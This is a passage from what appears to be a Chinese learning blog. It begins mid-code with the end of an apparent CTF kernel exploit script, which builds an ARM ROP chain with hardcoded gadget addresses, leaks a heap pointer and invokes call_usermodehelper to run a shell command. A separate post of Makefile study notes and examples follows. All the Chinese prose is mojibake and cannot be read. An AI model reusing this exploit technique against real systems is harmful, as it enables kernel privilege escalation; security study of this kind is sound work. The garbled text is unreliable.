class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80427e38</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">16</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    payload=str_change(payload,p32(call_usermodehelper),stack+<span class="number">4</span>*<span class="number">18</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80427e38 &lt;call_with_stack+32&gt;:	ldr	sp, [sp, #4]</span></span><br><span class="line"><span class="string">    0x80427e3c &lt;call_with_stack+36&gt;:	bx	lr</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¯¹æ ‡å¿—æ§åˆ¶ä¸ä¸¥æ ¼å¯¼è‡´çš„æ¼æ´ç±»å‹æœ‰äº†æ¯”è¾ƒæ·±åˆ»çš„å°è±¡ï¼Œäº†è§£å­¦ä¹ äº†armæŒ‡ä»¤é›†ä»¥åŠå¯»æ‰¾gadgetçš„æ€è·¯ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/08/makefile/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/08/makefile/" class="post-title-link" itemprop="url">makefile</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-09-08 17:15:57 / ä¿®æ”¹æ—¶é—´ï¼š17:16:13" itemprop="dateCreated datePublished" datetime="2022-09-08T17:15:57+08:00">2022-09-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Makefileå­¦ä¹ "><a href="#Makefileå­¦ä¹ " class="headerlink" title="Makefileå­¦ä¹ "></a>Makefileå­¦ä¹ </h1><p>ä¹‹å‰åªæ˜¯ç•¥æœ‰äº†è§£ï¼Œæ„Ÿè§‰ååˆ†æ–¹ä¾¿ï¼Œæ‰€ä»¥æƒ³æ·±å…¥äº†è§£ä¸€ä¸‹ã€‚</p>
<h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>Makefileæ˜¯ä¸€ä¸ªè§„åˆ™æ–‡ä»¶ï¼Œmakeæ˜¯ä¸€ä¸ªç¨‹åºï¼Œåœ¨å‘½ä»¤è¡Œé”®å…¥makeåï¼Œmakeè‡ªåŠ¨æ‰¾è§Makefileæ¥è§£æå…¶ä¸­çš„è§„åˆ™æ¥å®Œæˆç¼–è¯‘å·¥ä½œã€‚</p>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello-world"></a>hello-world</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907185029578.png" alt="image-20220907185029578"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:</span><br><span class="line">	@echo &quot;hello world&quot;</span><br><span class="line">	@ls ./</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make</span><br><span class="line">hello world</span><br><span class="line">Makefile</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">a:</span></span><br><span class="line">	@echo <span class="string">&quot;hello world&quot;</span></span><br><span class="line">	@ls ./</span><br><span class="line">	gcc main.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	@rm -rf a.out</span><br><span class="line">	@echo <span class="string">&quot;a.out del success&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make</span><br><span class="line">hello world</span><br><span class="line">main.c	Makefile</span><br><span class="line">gcc main.c</span><br><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make clean</span><br><span class="line">a.out del success</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907190203085.png" alt="image-20220907190203085"></p>
<h2 id="ç¼–è¯‘æµç¨‹"><a href="#ç¼–è¯‘æµç¨‹" class="headerlink" title="ç¼–è¯‘æµç¨‹"></a>ç¼–è¯‘æµç¨‹</h2><p>é¦–å…ˆæ˜¯æŠŠå„ä¸ªæ–‡ä»¶å…ˆç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼Œç„¶åå†ç»Ÿä¸€æŠŠç›®æ ‡æ–‡ä»¶è¿›è¡Œé“¾æ¥ï¼Œè¿™æ ·åšçš„å¥½å¤„å°±æ˜¯å½“ä¿®æ”¹äº†ä¸€ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨æ‰§è¡Œ<code>make</code>å¹¶ä¸ä¼šæŠŠæ‰€æœ‰æ–‡ä»¶å…¨éƒ¨å†ç¼–è¯‘ä¸€æ¬¡ï¼Œè€Œæ˜¯åªæŠŠæ”¹åŠ¨çš„å’Œæ”¹åŠ¨ç›¸å…³çš„ä»£ç å†ç¼–è¯‘ä¸€éã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">calc:add.o sub.o multi.o</span><br><span class="line">	gcc add.o sub.o multi.o calc.cpp -o calc</span><br><span class="line"></span><br><span class="line">add.o:add.cpp</span><br><span class="line">	gcc -c add.cpp -o add.o</span><br><span class="line"></span><br><span class="line">sub.o:sub.cpp</span><br><span class="line">	gcc -c sub.cpp -o sub.o</span><br><span class="line"></span><br><span class="line">multi.o:multi.cpp</span><br><span class="line">	gcc -c multi.cpp -o multi.o</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907194008573.png" alt="image-20220907194008573"></p>
<h2 id="å˜é‡ä½¿ç”¨"><a href="#å˜é‡ä½¿ç”¨" class="headerlink" title="å˜é‡ä½¿ç”¨"></a>å˜é‡ä½¿ç”¨</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907195303414.png" alt="image-20220907195303414"></p>
<p>å¯ä»¥è‡ªå®šä¹‰å˜é‡ï¼Œç„¶åç”¨$(å˜é‡å)æ¥ä½¿ç”¨è¿™ä¸ªå˜é‡</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	gcc <span class="variable">$(OBJ)</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	gcc -c add.cpp -o add.o</span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	gcc -c sub.cpp -o sub.o</span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	gcc -c multi.cpp -o multi.o</span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	gcc -c calc.cpp -o calc.o</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o calc</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨ç³»ç»Ÿå˜é‡æ›´åŠ ç®€åŒ–</p>
<p>$^å°±æ˜¯æ‰€æœ‰ä¸é‡å¤çš„ä¾èµ–æ–‡ä»¶ä¹Ÿå°±æ˜¯<code>:</code>åé¢è·Ÿç€çš„å†…å®¹ï¼Œ$(TARGET)å†’å·åé¢æ˜¯å˜é‡<code>OBJ</code>,æ‰€ä»¥æ˜¯<code>add.o sub.o multi.o calc.o</code>,$@æ˜¯ç›®æ ‡æ–‡ä»¶çš„å®Œæ•´åç§°ï¼Œä¹Ÿå°±æ˜¯<code>$(TARGET)</code>,æœ€å<code>gcc $^ -o $@</code>=<code>gcc add.o sub.o multi.o calc.o -o calc</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿå¸¸é‡æ¥å®Œæˆè·¨å¹³å°çš„ä¸€äº›æ•ˆæœ</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<h2 id="ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…"><a href="#ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…" class="headerlink" title="ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…"></a>ä¼ªç›®æ ‡å’Œæ¨¡å¼åŒ¹é…</h2><h3 id="ä¼ªç›®æ ‡"><a href="#ä¼ªç›®æ ‡" class="headerlink" title="ä¼ªç›®æ ‡"></a>ä¼ªç›®æ ‡</h3><p>æŒ‰ç…§æˆ‘çš„ç†è§£ï¼Œå¯èƒ½å¹¿ä¹‰ä¸Šæ¥è¯´ç›®æ ‡å°±æ˜¯æŒ‡è¿™ä¸ªç›®æ ‡çš„å‘½ä»¤æ‰§è¡Œåæœ€åäº§ç”Ÿçš„æ–‡ä»¶åï¼Œä¸€èˆ¬<code>make clean</code>å°±æ˜¯æ‰§è¡Œcleanç›®æ ‡çš„å‘½ä»¤ï¼Œå¦‚æœåœ¨å½“å‰ç›®å½•ä¸‹touchäº†ä¸€ä¸ªcleanæ–‡ä»¶ï¼Œç„¶åå†æ‰§è¡Œ<code>make clean</code>ä¼šå‘ç°æ²¡æœ‰æ‰§è¡Œå‘½ä»¤ï¼ŒåŸå› å°±æ˜¯makeè®¤ä¸ºcleanæ–‡ä»¶å°±æ˜¯ç›®æ ‡ï¼Œå·²ç»å­˜åœ¨è€Œä¸”æ²¡æœ‰æ›´æ–°æ‰€ä»¥ä¸éœ€è¦æ‰§è¡Œå‘½ä»¤äº†ã€‚</p>
<p>å¯¹äºè¿™ç§æƒ…å†µå°±å¾—å£°æ˜<code>clean</code>ä¸ºä¼ªç›®æ ‡äº†ï¼Œæ‰€ä»¥å¯ä»¥çœ‹å‡ºå½“å½“å‰ç›®æ ‡ä¸ç”Ÿæˆå¯¹åº”æ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€ç§åŠŸèƒ½ç›®æ ‡æ—¶å°±åº”è¯¥æŠŠä»–å£°æ˜æˆä¼ªç›®æ ‡ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907201801523.png" alt="image-20220907201801523"></p>
<h3 id="æ¨¡å¼åŒ¹é…"><a href="#æ¨¡å¼åŒ¹é…" class="headerlink" title="æ¨¡å¼åŒ¹é…"></a>æ¨¡å¼åŒ¹é…</h3><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907204648885.png" alt="image-20220907204648885"></p>
<p>æ„Ÿè§‰è¿™ä¸ªè§„åˆ™è¿˜æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œå°±æ‹¿ä¸Šé¢çš„makefileæ¥è¯´ï¼Œå¯ä»¥ä¿®æ”¹æˆä¸‹é¢çš„æ ·å­,makefileå°±ç¼©çŸ­æˆå‡ è¡Œçš„æ ·å­äº†ï¼Œè‡³äºè¿™æ¡è§„åˆ™çš„åŸç†ï¼Œå¤§æ¦‚å°±æ˜¯ä»–ä¼šç”Ÿæˆç¬¬ä¸€ä¸ªç›®æ ‡ä¹Ÿå°±æ˜¯<code>$(TARGET):$(OBJ)</code>ï¼Œç„¶åå‘ç°<code>add.o sub.o multi.o calc.o</code>è¿™äº›ä¾èµ–æ–‡ä»¶éƒ½æ²¡æœ‰ç”Ÿæˆï¼Œç„¶åå°±ä¼šå»æ‰¾ç”Ÿæˆè¿™äº›æ–‡ä»¶çš„ç›®æ ‡ï¼Œé¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ª<code>add.o</code>ï¼Œ<code>%.o:%.cpp</code>ç›®æ ‡å°±èƒ½åŒ¹é…ï¼Œç„¶åå°±ä¼šæ‰§è¡Œè¿™ä¸ªç›®æ ‡çš„å‘½ä»¤ï¼Œè¿›è€Œç”Ÿæˆ<code>add.o</code>,å…¶ä»–æ‰€æœ‰çš„ç›®æ ‡æ–‡ä»¶ä¹Ÿæ˜¯è¿™æ ·ç”Ÿæˆï¼Œæœ€åç”Ÿæˆ<code>calc</code>ã€‚</p>
<p>é€šè¿‡è¿™ä¸ªæ¨¡å¼åŒ¹é…ï¼Œæ„Ÿè§‰makefileå°±æ˜¯ä¸€å±‚å¥—ä¸€å±‚ï¼Œç„¶åä»æœ€åº•å±‚å¾€ä¸Šæ‰¾ï¼Œç›´åˆ°æœ€åº•å±‚çš„ä¾èµ–å…¨ç¨‹éƒ½æœ‰äº†ï¼Œå†æ‰§è¡Œæœ€åº•å±‚çš„å‘½ä»¤ã€‚æœ‰ç‚¹é€’å½’é‚£å‘³äº†ã€‚</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªmakefileè¿˜å¯ä»¥åˆ©ç”¨<code>wildcard</code>å’Œ<code>patsubst</code>æ¥å¢åŠ makefileçš„æ³›ç”¨æ€§</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#OBJ= sub.o multi.o calc.o add.o</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> %.cpp,%.o,$(<span class="built_in">wildcard</span> ./*.cpp)</span>)</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“"><a href="#ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“"></a>ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“</h2><p>æ„Ÿè§‰ã€‚ã€‚ã€‚æ²¡å•¥ã€‚ã€‚ã€‚ã€‚ï¼Œå’Œmakefileå…³ç³»ä¸å¤§</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907215742516.png" alt="image-20220907215742516"></p>
<h2 id="é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶"><a href="#é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶" class="headerlink" title="é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶"></a>é€šç”¨éƒ¨åˆ†åšå…¬å…±å¤´æ–‡ä»¶</h2><p>makefileè¿˜æœ‰è‡ªåŠ¨æ¨å¯¼èƒ½åŠ›ï¼Œä¸Šé¢çš„makefileè¿˜å¯ä»¥ç®€çŸ­åˆ°ä»¥ä¸‹å‡ è¡Œ</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#OBJ= sub.o multi.o calc.o add.o</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> %.cpp,%.o,$(<span class="built_in">wildcard</span> ./*.cpp)</span>)</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>makefileè¿˜èƒ½åµŒå¥—makefile,é‚£å°±å¯ä»¥æŠŠé€šç”¨çš„å†…å®¹å†™åœ¨ä¸€ä¸ªmakefileä¸­ï¼Œç„¶ååœ¨å…¶ä»–makefileä¸­ä½¿ç”¨ï¼Œå¦‚ä¸‹ä¾‹</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TARGET=c</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> ../makefile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å…¬å…±</span></span><br><span class="line"></span><br><span class="line">SOURCE=<span class="variable">$(<span class="built_in">wildcard</span>  ./*.cpp ./*.c)</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span>  %.cpp,%.o,<span class="variable">$(SOURCE)</span>)</span></span><br><span class="line">OBJ:=<span class="variable">$(<span class="built_in">patsubst</span>  %.c,%.o,<span class="variable">$(OBJ)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line">	</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line">	</span><br><span class="line"><span class="section">show:</span></span><br><span class="line">	echo <span class="variable">$(SOURCE)</span></span><br><span class="line">	echo <span class="variable">$(OBJ)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨makefileä¸­éƒ½æ˜¯å…ˆè§£ææ‰€æœ‰å˜é‡ç„¶åå†æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥å˜é‡çš„å£°æ˜æ”¾åœ¨å“ªé‡Œéƒ½æ˜¯æ²¡æœ‰æ‰€è°“çš„ã€‚</p>
<p><code>=</code>,èµ‹å€¼æ“ä½œï¼ŒæŠŠç»ˆå€¼èµ‹å€¼ç»™å˜é‡ï¼Œæ³¨æ„ä¸èƒ½å­—èŠ‚èµ‹å€¼ç»™å­—èŠ‚ï¼Œæ¯”å¦‚Y=$(Y)</p>
<p><code>ï¼š=</code>ä¹Ÿæ˜¯èµ‹å€¼ï¼Œä½†æ˜¯ä¸<code>=</code>ä¸åŒçš„æ˜¯ä»–ä¸ä¼šå—åˆ°å®ƒä¸‹é¢çš„ä»£ç ä»¥åŠå˜é‡çš„å½±å“ã€‚</p>
